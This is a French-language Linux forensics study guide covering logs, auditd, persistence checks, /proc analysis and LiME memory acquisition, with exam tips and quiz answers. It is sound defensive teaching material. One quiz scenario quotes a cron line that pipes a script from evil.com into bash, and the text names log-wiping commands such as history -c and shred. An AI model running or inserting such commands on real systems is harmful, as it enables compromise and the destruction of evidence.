🐧 Linux forensique — Philosophie "tout est fichier"
Sur Linux, tout est exposé via le système de fichiers : les processus dans /proc/, les périphériques dans /dev/, les configurations dans /etc/, les logs dans /var/log/. Contrairement à Windows, il n'y a pas de registre centralisé — les artefacts sont dispersés en fichiers texte plats, bases SQLite et journaux binaires. Bonne nouvelle : beaucoup sont lisibles sans outils spécialisés. Mauvaise nouvelle : ils peuvent être effacés trivialmente (history -c, shred, echo "" > /var/log/auth.log).

🔍 Commandes de triage rapide

  • last -f /var/log/wtmp — historique connexions
  • lastb -f /var/log/btmp — tentatives échouées
  • find / -mtime -7 -type f 2>/dev/null — fichiers modifiés < 7j
  • find / -perm -4000 -type f 2>/dev/null — binaires SUID
  • awk -F: '($3==0){print}' /etc/passwd — UID 0 = root

⚠️ Signaux d'anti-forensique Linux

  • HISTFILE=/dev/null ou HISTSIZE=0 dans .bashrc
  • shred -u sur des fichiers — écrasement sécurisé
  • wtmp/btmp/auth.log vidés ou tronqués
  • Timestamp mtime modifié via touch -t
  • Binaire avec nom légitime dans /tmp/ ou /dev/shm/
Architecture des logs Linux — deux systèmes coexistent
📋 Syslog classique — /var/log/
Format : texte brut, lisible directement
Outil : grep, awk, tail -f
Rotation : logrotate (compresse en .gz)
Risque : effaçable par root (echo "" > auth.log)
Fichiers clés : auth.log, syslog, kern.log, apache2/
🔵 systemd-journald — binaire
Format : binaire structuré, indexé
Outil : journalctl (filtres puissants)
Stockage : /var/log/journal/ (persistant) ou /run/log/journal/ (volatile)
Intégrité : FSS (Forward Secure Sealing) optionnel
Avantage : métadonnées enrichies (PID, UID, COMM)

auditd — Surveillance syscall niveau kernel
🎯 auditd est le système d'audit Linux le plus puissant pour la forensique. Configuré correctement, il enregistre chaque execve() (exécution de commande), chaque accès à un fichier sensible, chaque connexion réseau. Il n'est pas actif par défaut sur toutes les distributions. Sa présence ou absence est elle-même un indicateur forensique.
Type d'événementChamp auditValeur forensique
SYSCALLtype=SYSCALLChaque appel système : execve, open, connect, unlink. Avec UID réel et UID effectif (détecte sudo).
EXECVEtype=EXECVEArguments complets de la commande exécutée. Indispensable pour reconstituer les actions d'un attaquant.
USER_LOGINtype=USER_LOGINChaque connexion réussie ou échouée avec timestamp précis.
PATHtype=PATHFichier accédé ou modifié lors du syscall. Inclut le chemin complet et l'inode.
NETFILTER_PKTtype=NETFILTERPaquets réseau filtrés — révèle les connexions bloquées ou suspectes.

🔎 ausearch — requêtes forensiques

  • ausearch -m execve --start 03/15/2024 --end 03/16/2024
  • ausearch -ua 0 -m USER_LOGIN — connexions root
  • ausearch -f /etc/passwd — accès au fichier passwd
  • aureport --login --summary — résumé connexions
  • aureport --executable --summary — exécutables lancés

📍 Localiser les journaux sur image disque

  • Logs texte : /var/log/*.log et *.log.[0-9].gz
  • Journal systemd : /var/log/journal/<machine-id>/
  • Audit : /var/log/audit/audit.log*
  • Parser hors-ligne : journalctl -D /mnt/journal/
  • Rotation : chercher aussi /var/log/syslog.1, .2.gz…
🎓 Exam Tip — Logs Linux

auth.log = authentifications SSH/sudo · syslog = logs généraux · audit.log = syscalls kernel

journalctl lit les journaux binaires systemd — les logs texte /var/log/ coexistent séparément

Priorité d'acquisition : wtmp + btmp + auth.log + audit.log + bash_history avant de couper la machine

Signal d'alerte : auth.log vide ou tronqué alors que le système tourne depuis des semaines → anti-forensique

🔄 Persistance Linux — mécanismes et artefacts
Linux offre de nombreux points de persistance légitimes détournables. Contrairement à Windows qui centralise tout dans le Registre, les mécanismes Linux sont dispersés dans des dizaines de fichiers et répertoires. Un attaquant peut maintenir un accès permanent sans modifier un seul binaire système. La clé est de connaître tous les emplacements à vérifier.

Vérification rapide — Checklist persistance Linux
1. Comptes utilisateurs suspects
awk -F: '($3==0){print "UID 0: "$1}' /etc/passwd
awk -F: '($7 !~ /nologin|false/){print $1" shell:"$7}' /etc/passwd
cat /etc/sudoers | grep -v "^#"
2. Cron / tâches planifiées
for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /var/spool/cron/crontabs/
cat /etc/crontab
3. Services systemd non standard
systemctl list-units --type=service --state=running
find /etc/systemd/ /usr/lib/systemd/ -name "*.service" -newer /bin/bash
find ~/.config/systemd/ -name "*.service" 2>/dev/null
4. SSH keys & fichiers de config
find /root /home -name "authorized_keys" -exec ls -la {} \;
find /root /home -name "authorized_keys" -exec cat {} \;
cat /etc/ssh/sshd_config | grep -E "PermitRoot|AuthorizedKeys|Port"
5. Binaires SUID & modules noyau
find / -perm -4000 -type f 2>/dev/null | sort
lsmod | grep -v "^Module"
find /lib/modules/ -name "*.ko" -newer /boot/vmlinuz* 2>/dev/null
🎯 Cas réel — Vecteur de persistance Xplain (2023, contexte suisse)
L'incident Xplain (prestataire IT de la Confédération suisse) a impliqué un ransomware Play ayant compromis des serveurs Linux et Windows. Les investigations ont révélé des clés SSH non autorisées et des scripts cron malveillants comme mécanismes de persistance, permettant aux attaquants de maintenir leur accès plusieurs semaines avant le déclenchement du ransomware. Les logs auditd n'étaient pas activés sur les systèmes Linux compromis — limitant fortement la reconstruction de la timeline.
Un administrateur constate que /etc/cron.d/update exécute toutes les 5 minutes curl http://evil.com/shell.sh | bash. Quels artefacts permettent de dater la création de ce fichier ?Persistance · Niveau : moyen
Timestamps du fichier : stat /etc/cron.d/update → mtime (modification), ctime (changement inode), atime (accès).
Logs syslog/cron : premier enregistrement de l'exécution dans /var/log/syslog.
Audit log : si auditd actif, ausearch -f /etc/cron.d/update révèle qui a créé le fichier avec quel UID.
Bash history : si l'attaquant a opéré en shell interactif, ~/.bash_history peut contenir la commande de création.
Attention : les timestamps peuvent être falsifiés via touch -t — croiser les sources.
⚙️ /proc — Le système de fichiers virtuel de la mémoire
/proc/ est un système de fichiers virtuel qui expose l'état interne du noyau et de chaque processus en temps réel. Il ne réside pas sur disque — il est généré à la volée par le noyau. C'est la source d'information live la plus précieuse sur un système en cours d'exécution : commandes complètes, fichiers ouverts, connexions réseau, variables d'environnement, mappings mémoire.

Fichier /proc/ContenuUsage forensique

/proc/net/tcp6		 Connexions TCP actives (hex). État : 0A=LISTEN, 01=ESTABLISHED, 06=TIME_WAIT. Identifier connexions suspectes même si ss/netstat sont modifiés par un rootkit.
/proc/net/unix Sockets Unix domain (communication inter-processus locale). C2 fileless peut communiquer via sockets Unix pour éviter le réseau.

/proc/uptime Temps de fonctionnement en secondes depuis le démarrage. Estimer la date de démarrage du système (time_now − uptime).
/proc/version Version du noyau, compilateur utilisé, date de compilation. Identifier la distribution et les vulnérabilités potentielles du noyau.
/proc/swaps Partitions/fichiers swap actifs et taille utilisée. Le swap peut contenir des fragments de mémoire — à acquérir aussi.
⚡ Astuce forensique — fichier supprimé mais processus ouvert
💡 Sur Linux, quand un processus ouvre un fichier puis que ce fichier est supprimé (rm), le contenu reste accessible tant que le processus n'est pas arrêté. Chemin : /proc/[PID]/fd/[numéro]. Technique de récupération en temps réel — indépendante du système de fichiers.
# Lister tous les fichiers supprimés encore ouverts
ls -la /proc/*/fd 2>/dev/null | grep deleted

# Récupérer le contenu d'un fichier supprimé (PID 1234, fd 3)
cp /proc/1234/fd/3 /evidence/recovered_file

# Voir la commande qui a ouvert ce fichier
cat /proc/1234/cmdline | tr '\0' ' '

🔬 Détecter un processus masqué par rootkit

  • Comparer ps aux avec ls /proc/ | grep [0-9]
  • PID présent dans /proc/ mais absent de ps = rootkit user-space
  • /proc/net/tcp vs ss -antp : divergence = hook réseau
  • Outil : unhide (scan brute-force des PIDs 1–65535)
  • Dernier recours : dump mémoire + Volatility (plugins linux_pslist vs linux_psscan)

📊 Analyse réseau depuis /proc (anti-rootkit)

  • cat /proc/net/tcp → colonnes : local_addr:port remote_addr:port state uid inode
  • Convertir hex : 0A = 10 = port 10 (inverser octets pour l'IP)
  • Croiser inode avec ls -la /proc/*/fd/ → retrouver le PID
  • État 0A = LISTEN · 01 = ESTABLISHED · 06 = TIME_WAIT
  • Comparer avec ss -antp — toute divergence = manipulation
💾 Acquisition Linux — Ordre de volatilité (RFC 3227)
L'acquisition Linux suit le même principe universel : du plus volatil au moins volatil. La mémoire vive disparaît à la mise hors tension. Les logs en RAM (journald /run/) disparaissent aussi. Agir dans l'ordre et documenter chaque action.

LiME — Linux Memory Extractor
🔑 LiME (Linux Memory Extractor) est le standard DFIR pour l'acquisition de la RAM Linux. C'est un module noyau (.ko) à charger via insmod. Il doit être compilé pour la version exacte du noyau cible — un LiME compilé pour Ubuntu 22.04 ne fonctionnera pas sur Ubuntu 20.04.
# 1. Compiler LiME (sur machine identique ou cross-compile)
git clone https://github.com/504ensicsLabs/LiME.git && cd LiME/src && make

# 2. Acquisition vers fichier local
insmod lime.ko "path=/mnt/evidence/ram.lime format=lime"

# 3. Acquisition vers réseau (évite d'écrire sur le disque cible)
insmod lime.ko "path=tcp:4444 format=lime"
# Côté analyste :
nc -l -p 4444 > ram.lime

# 4. Vérifier l'intégrité
sha256sum ram.lime > ram.lime.sha256

🎓 Exam Tip — Acquisition Linux

LiME = module noyau (.ko) — doit correspondre exactement à la version du noyau cible

Format lime = format recommandé pour Volatility · format raw = dd-compatible

Acquisition réseau (path=tcp:4444) = écriture zéro sur disque cible — préférer cette méthode

Avant extinction : collecter /proc/, RAM, swap, journal /run/ — ils disparaissent

Intégrité : toujours sha256sum avant ET après copie — documenter la chaîne de custody

Un technicien DFIR arrive sur un serveur Linux Ubuntu 22.04 compromis et toujours en ligne. Il dispose d'une clé USB et d'un accès root. Dans quel ordre doit-il procéder pour préserver un maximum de preuves ?Acquisition · Niveau : moyen
1. Documentation préalable : photographier l'écran, noter l'heure système, la date, les connexions actives (ss -antp, who, w).
2. Collection /proc/ volatile : script de triage — sauvegarder ps auxef, netstat -antp, /proc/net/tcp, lsmod, last vers la clé USB.
3. Acquisition RAM : charger LiME vers la clé USB (insmod lime.ko "path=/mnt/usb/ram.lime format=lime") ou vers réseau (path=tcp:4444).
4. Journal /run/ : journalctl -D /run/log/journal/ -o export > /mnt/usb/journal_volatile.bin
5. Image disque : dcfldd if=/dev/sda of=/mnt/nas/disk.dd hash=sha256 hashlog=/mnt/nas/disk.sha256
6. Hasher tout et documenter la chaîne de custody avant de quitter la scène.
